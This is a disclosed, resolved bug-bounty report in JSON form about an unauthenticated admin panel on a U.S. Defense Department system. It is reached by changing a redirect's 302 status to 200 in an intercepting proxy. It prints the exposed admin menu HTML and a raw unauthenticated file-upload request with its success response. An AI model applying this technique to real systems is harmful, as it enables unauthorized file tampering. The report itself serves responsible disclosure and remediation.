{
  "id": 1397564,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzk3NTY0",
  "url": "https://hackerone.com/reports/1397564",
  "title": "Unauthenticated Access to Admin Panel Functions at https://███████/███",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2021-11-10T14:56:36.521Z",
  "submitted_at": "2021-11-10T14:56:36.571Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "palaziv",
    "url": "/palaziv",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/3qqqmf4szognjgdr74j9fneri1e8/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1?response-content-disposition=inline%3B%20filename%3D%228681088.png%22%3B%20filename%2A%3DUTF-8%27%278681088.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6XZ75VLH%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T010238Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEH0aCXVzLXdlc3QtMiJHMEUCIQDECnJcfl0Eq0WEce0sXVsMPYE9TxVhuH%2BDI7sbM%2BVujAIgB155vlj0WWmwJFZZ%2FsxtvBiK1tBcJq33Ps2ZWCAvUHoquwUI9v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDAY%2Fk%2F9R%2BeZ39FomTiqPBUJIeWPuyvkFXXn9ZwSWDpEYohpX5IQu1FD61Oylzt8Tmjkf7siy8JW2JPg3PhHjr79f8BK4hoZRuLcqxyErcCBqP1%2BN%2B8NAc6yAMwZwQo8D3z4dkT0wpese0THsVNAo4GoGQTC04jxPUTZVKot6%2FQ%2BhI3NxepCFXOMiNaztvecCoa8Q0cdFWL6RUQ74MI%2BH7aZKP5I%2Fc0s%2FKz3ueMiE7W3rKDfaV6TgSXyiYOkbamgB8%2BSBqPEEzFi2ONdyStNY2E4v7S4WlpSduWOvbwzoa2jwdLzFgb74Fn96slLXTcLgzdEizWzfCdkgBgC6dufqhF59lLXe%2Fe9jqUkqQCA01X06F%2BmCr%2BGOFF%2BsSfyDzQwxC49Ws6CDk1z1NKzTAwd3WICuTH%2FJvbAbHDDZd%2B4g%2Fk7uTvjkqaEtqJTaw4Yx8ytTEKW2gu84btUXv%2F1xyYSglVLV00fAwFTXg5%2Fm1geOQqTjchUy6uTAahHFnIDR0vImJSgawRIDp46hXra3YFibBd6UgjaaiKms6pU366XRUxpeMC6hWPLIYIDxO7udSR%2Br41qGTJWgzVZ8c%2BOxTQIGOwXnjsemWB8qXDlnmY4RF8qfhuu58n0jfqidU0IOfLmVb2M7fyG8wynZuMbCrr0un%2Fo%2BYooqsQSTuBwygACh2lJPhCYgvs0Ox2CfVR0tQc8CwPC4eXnvDl6p6dcho%2BOGdhBTND%2FD0%2BteDCfRM3BzhDJQeNFqukLq66EX50GzOA9v4Ejep93jBYWmitT0XTKRJgqs7Fcju%2FdWNM9wAPstmUzZqsUg6LZlwP8qx3wjl%2B9cUAsr%2FZXn%2FKL8%2FVfhef6zL%2BNFevoUH9HZwsd9s%2FX2G%2F%2Bt6QcSlS4tEGXxqMhu77wwiqO8xgY6sQGNs3PYVL9l2SNiGW68KoeeM72F7au4rOLPJ8useKORCeIu2qBD6UNtP9OhTHV5vvNdVqOIbimuVSIFSMVAPh53vCALe9KYItkd%2FvjKVe%2BI71htxVWhrbcdJ6%2BxLSj1XqEtPcho%2F9Hm6uA3N56iVMxGeHdCFGSCqPZhmZdYWl8OJTF6aE9Qg%2Bknqjnt0%2FWrXKev8xole45slVpOR6OEGmzRCItD4WhPVZkVWeLYa49tdRA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0dfb3e04f35c4ac5a2cad6e9a95efbcdc39d3ca936ebd221d4c25eef06518d9e"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 16064,
    "url": "https://hackerone.com/deptofdefense",
    "handle": "deptofdefense",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "U.S. Dept Of Defense",
      "twitter_handle": "DC3VDP",
      "website": "https://bit.ly/3ntULtN",
      "about": ""
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2021-11-29T22:16:07.481Z",
  "bug_reporter_agreed_on_going_public_at": "2021-11-17T17:00:32.595Z",
  "team_member_agreed_on_going_public_at": "2021-11-29T22:16:07.375Z",
  "comments_closed?": true,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "**Description:**\nThe admin panel at https://██████████/████████ and all its functions can be accessed without authentication. This is basically the same vulnerability as in #1394910, just on another system.\n\n## Impact\n\nAn attacker is able to use the administrative functions in order to upload, delete or modify files.\n\n## System Host(s)\n███\n\n## Affected Product(s) and Version(s)\n██████████\n\n## CVE Numbers\n\n\n## Steps to Reproduce\n* Navigate to https://███/ and click on the \"Authenticate ██████████\" button\n* Notice how the application first sends an HTTP POST request to https://███████/████████ which should redirect to https://██████/██████████ (`Location: █████`). Navigating to  https://███/██████ redirects to https://█████/███\n* Looking at the response to https://█████/███ I noticed that even though the server sent back a 302 status code with a header `Location: /██████████` the response was quite long\n* I browsed to https://█████████/████████, intercepted the response in Burp, changed the status code from `302 Found` to `200 OK` and was presented with the admin panel (this kind of attack is called [Execution after Redirect](https://owasp.org/www-community/attacks/Execution_After_Redirect_(EAR))). Below you can see the unmodified response containing links to the ██████ Admin Functions:\n\n```\nHTTP/1.1 302 Found\nDate: Wed, 10 Nov 2021 14:28:15 GMT\nContent-Type: text/html; charset=UTF-8\nConnection: close\nCache-Control: no-store, no-cache, must-revalidate\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nLocation: /██████\nPragma: no-cache\nSet-Cookie: █████████; path=/; HttpOnly\nSet-Cookie: ███████; Path=/; HttpOnly; Secure\nX-Vcap-Request-Id: 3c110e5d-196e-46f4-503d-222157e0c465\nStrict-Transport-Security: max-age=31536000; includeSubDomains\n██████████████████\nContent-Length: 4266\n\n\n<!-- Unused LIMDIS banner in WWW  \n\n<table align=\"center\" width=\"800\" border=\"1\" cellspacing=\"1\"\n\tcellpadding=\"1\" bgcolor=\"#008000\">\n\t<tr>\n\t\t<td style=\"color: #FFF\";  align=\"center\">LIMITED DISTRIBUTION<br> <font\n\t\t\tsize=\"2px\">Distribution authorized to DoD, IAW 10 U.S.C. §§ 130 &\n\t\t\t\t455. Release authorized to U.S. DoD contractors, IAW 48 C.F.R. §\n\t\t\t\t252.245-7000. Refer other requests to: Headquarters, ██████████, ATTN:\n\t\t\t\tRelease Of ficer, ███████, ██████,\n\t\t\t\t█████. Destroy IAW DoDI 5030.59. Removal of this caveat is\n\t\t\t\tprohibited.</font></td>\n\t</tr>\n</table>\n--><!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\n<html lang='en' xmlns=\"http://www.w3.org/1999/xhtml\">\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\n<title>Admin</title>\n<script src=\"../███████/SpryAssets/SpryMenuBar.js\" type=\"text/javascript\"></script>\n<link href=\"../█████/SpryAssets/SpryMenuBarHorizontal.css\"\n\trel=\"stylesheet\" type=\"text/css\" />\n</head>\n\n<body>\n\t<table align=\"center\" bgcolor=\"50D6EE\" border=\"3\">\n\t\t<tr>\n\t\t\t<td colspan=\"2\" align=\"center\"><img\n\t\t\t\tsrc=\"../███████/images/███_banner_top.jpg\" /></td>\n\t\t</tr>\n\t\t<tr>\n\t\t\t<td align=\"center\"><br />\n            Welcome to ███  You are on World Wide Web<br /></td>\n\t\t</tr>\n\t\t<tr>\n\t\t\t<td>\n\t\t\t\t<div align=\"center\">\n\t\t\t\t\t<ul id=\"MenuBar1\" class=\"MenuBarHorizontal\">\n\t\t\t\t\t\t<li><a class=\"MenuBarItemSubmenu\" href=\"#\">Home</a></li>\n\t\t\t\t\t\t<li><a class=\"MenuBarItemSubmenu\" href=\"#\">█████ Admin Functions</a>\n\t\t\t\t\t\t\t<ul>\n\t\t\t\t\t\t\t\t<li><a href=\"s3html.php\">UpLoad Weekly</a></li>\n\t\t\t\t\t\t\t\t<li><a href=\"../███/██████/verifyfile.php\">Verify File Dates</a></li>\n\t\t\t\t\t\t\t\t<li><a href=\"#\">Add Single File</a>\n\t\t\t\t\t\t\t\t\t<ul>\n\t\t\t\t\t\t\t\t\t\t<li><a href=\"../██████████/██████████/addnewfile.php\" target=\"new\">VDU ADD\n\t\t\t\t\t\t\t\t\t\t</a></li>\n\t\t\t\t\t\t\t\t\t\t<li><a href=\"../██████/██████████/addvpf.php\" target=\"new\">VPF ADD</a></li>\n\t\t\t\t\t\t\t\t\t\t<li><a href=\"../██████████/█████/█████class.php\" target=\"new\">Change\n\t\t\t\t\t\t\t\t\t\t\t\tClassification</a></li>\n\t\t\t\t\t\t\t\t\t\t<li><a href=\"../████████/██████/██████████bull.php\">New ███</a></li>\n\t\t\t\t\t\t\t\t\t\t<li><a href=\"../██████████/█████████/███████loadgraph.php\" target=\"new\">Graphic\n\t\t\t\t\t\t\t\t\t\t\t\tADD</a></li>\n\t\t\t\t\t\t\t\t\t\t<li><a href=\"../██████/████████/██████delgrp.php\">Delete 'ALL' Graphic\n\t\t\t\t\t\t\t\t\t\t\t\tFiles</a></li>\n\t\t\t\t\t\t\t\t\t</ul></li>\n\t\t\t\t\t\t\t\t<li><a href=\"#\">Upload New Editions</a>\n\t\t\t\t\t\t\t\t\t<ul>\n\t\t\t\t\t\t\t\t\t\t<li><a href=\"../████████/█████/██████loadvdu.php\" target=\"new\">Install\n\t\t\t\t\t\t\t\t\t\t\t\tNew Base VDU </a></li>\n\t\t\t\t\t\t\t\t\t\t<li><a href=\"../███/██████████/█████loadvpf.php\" target=\"new\">Install\n\t\t\t\t\t\t\t\t\t\t\t\tNew base VPF </a></li>\n\t\t\t\t\t\t\t\t\t\t<li><a href=\"../█████████/██████████/███████loadtxt.php\" target=\"new\">Install/Update\n\t\t\t\t\t\t\t\t\t\t\t\t█████████##.txt</a></li>\n\t\t\t\t\t\t\t\t\t\t<li><a href=\"../███████/███████/███████newgraph.php\" target=\"new\">Replace\n\t\t\t\t\t\t\t\t\t\t\t\tall Graphic Files</a></li>\n\t\t\t\t\t\t\t\t\t</ul></li>\n\t\t\t\t\t\t\t\t<li><a href=\"#\">Modify Single File**</a>\n\t\t\t\t\t\t\t\t\t<ul>\n\t\t\t\t\t\t\t\t\t\t<li><a href=\"../██████/█████████/██████mod.php\">Modify ██████████ Chart</a></li>\n\t\t\t\t\t\t\t\t\t\t<li><a href=\"../██████████/███████/█████vitem.php\">Modify Library Specific\n\t\t\t\t\t\t\t\t\t\t\t\tFile</a></li>\n\t\t\t\t\t\t\t\t\t\t<li><a href=\"../████████/███/█████viteml.php\">Stop ALL VPFS from\n\t\t\t\t\t\t\t\t\t\t\t\tbeing viewed from specific Region</a></li>\n\t\t\t\t\t\t\t\t\t\t<li><a href=\"../█████/███/█████████graphic.php\">Modify Graphic\n\t\t\t\t\t\t\t\t\t\t\t\tSpecific File</a></li>\n\t\t\t\t\t\t\t\t\t</ul></li>\n\t\t\t\t\t\t\t\t<li><a href=\"../███████/████/██████████vpfdel.php\">DELETE VPF, VDU,\n\t\t\t\t\t\t\t\t\t\tGraphics</a></li>\n\t\t\t\t\t\t\t\t<li><a href=\"#\">Change Status of Deleted and New Records</a>\n\t\t\t\t\t\t\t\t\t<ul>\n\t\t\t\t\t\t\t\t\t\t<li><a href=\"../████/█████/████████deldel.php\">Change Record Status\n\t\t\t\t\t\t\t\t\t\t\t\tTo an ADDed or DELeted VDU Record</a></li>\n\t\t\t\t\t\t\t\t\t</ul></li>\n\t\t\t\t\t\t\t\t<li><a href=\"../████/█████/█████_documentation.php\">████\n\t\t\t\t\t\t\t\t\t\tDocumentation</a></li>\n\t\t\t\t\t\t\t</ul></li>\n\t\t\t\t\t\t<li><a href=\"dssLogout.php\">Logout</a></li>\n\t\t\t\t\t</ul>\n\t\t\t\t</div>\n\t\t\t\t<p>&nbsp;</p>\n\t\t\t\t<p>&nbsp;</p>\n\t\t\t\t<p>\n\t\t\t\t\t<br /> <br />\n\t\t\t\t</p>\n\t\t\t</td>\n\t\t</tr>\n\t\t<tr>\n\t\t\t<td><br /> <br /></td>\n\t\t</tr>\n\t\t<tr align=\"center\">\n\t\t</tr>\n\t</table>\n\t<script type=\"text/javascript\">\n    var MenuBar1 = new Spry.Widget.MenuBar(\"MenuBar1\", {imgDown:\"../SpryAssets/SpryMenuBarDownHover.gif\", imgRight:\"../SpryAssets/SpryMenuBarRightHover.gif\"});\n</script>\n</body>\n</html>\n\n```\n\n* The functions allow to upload, modify and to delete █████ files and can all be used completely unauthenticated. Following an example in which I upload a file; this upload function can be accessed from https://█████/██████/████/█████████bull.php. Note that the request has no session cookie:\n\n```\nPOST /████/███████/███████bulla.php HTTP/1.1\nHost: █████\nContent-Length: 401\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: https://█████\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryVxWfTBx5ZkXMXVG2\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: https://███████/█████/████/████████bull.php\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nConnection: close\nX-Bug-Bounty: HackerOne-palaziv\nX-Bug-Bounty: BurpSuitePro\n\n------WebKitFormBoundaryVxWfTBx5ZkXMXVG2\nContent-Disposition: form-data; name=\"bdate\"\n\n1970-01-01\n------WebKitFormBoundaryVxWfTBx5ZkXMXVG2\nContent-Disposition: form-data; name=\"userfile1\"; filename=\"test.txt\"\nContent-Type: text/plain\n\ntest\n\n------WebKitFormBoundaryVxWfTBx5ZkXMXVG2\nContent-Disposition: form-data; name=\"buttonm\"\n\nBegin Uploads\n------WebKitFormBoundaryVxWfTBx5ZkXMXVG2--\n```\n\nResponse:\n\n```\nHTTP/1.1 302 Found\nDate: Wed, 10 Nov 2021 14:44:57 GMT\nContent-Type: text/html; charset=UTF-8\nConnection: close\nCache-Control: no-store, no-cache, must-revalidate\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nLocation: ../../█████████/404.html\nPragma: no-cache\nSet-Cookie: JSESSIONID=fceoa3cccho3q5dc6ahec3ghav; path=/; HttpOnly\nSet-Cookie: ███; Path=/; HttpOnly; Secure\nX-Vcap-Request-Id: ffb083d0-f29b-4623-5249-9f015b9cc59f\nStrict-Transport-Security: max-age=31536000; includeSubDomains\nSet-Cookie: TS01b8cd54=01dc86b24807c4064ee7333f073dd2db329d550bf5a80b061306a56af136c21560cefb7fa74dbd19a258797185afd48dfdfb9f2dca; Path=/; Domain=.█████████\nContent-Length: 173\n\n<br>Upload SUCCESS!<br>S3 ObjectURL: https://pcf-om-mil-86e7ccdd-b099-4b50-aad2-cad52466327b.s3.amazonaws.com/██████████/███████SiteContent/█████████████.zip<br>error in █████ table \n```\n\nThis uploaded file can be downloaded again on https://█████████.██████████/████/███/███.php (another system) by clicking on the \"██████████ ███████\" link: https://██████.█████████/█████████/██████████/downloadS3File.php?file=███%2F██████SiteContent%2F███████.zip\n\n## Suggested Mitigation/Remediation Actions\nImplement proper access controls.\n\nMitigation for the Execution after Redirect vulnerability: Proper termination should be performed after redirects. In a function a return should be performed. In other instances functions such as die() should be performed. This will tell the application to terminate regardless of if the page is redirected or not.\n\n",
  "weakness": {
    "id": 26,
    "name": "Improper Access Control - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 13,
  "voters": [
    "shreyaschavhan",
    "spaghettisec",
    "mohaned0101",
    "0xwise",
    "official_blackhat13",
    "alertjd",
    "elhassane",
    "frank-hacker2000",
    "destinedtohack",
    "woltes",
    "and 3 more..."
  ],
  "severity": {
    "rating": "critical",
    "author_type": "Team"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
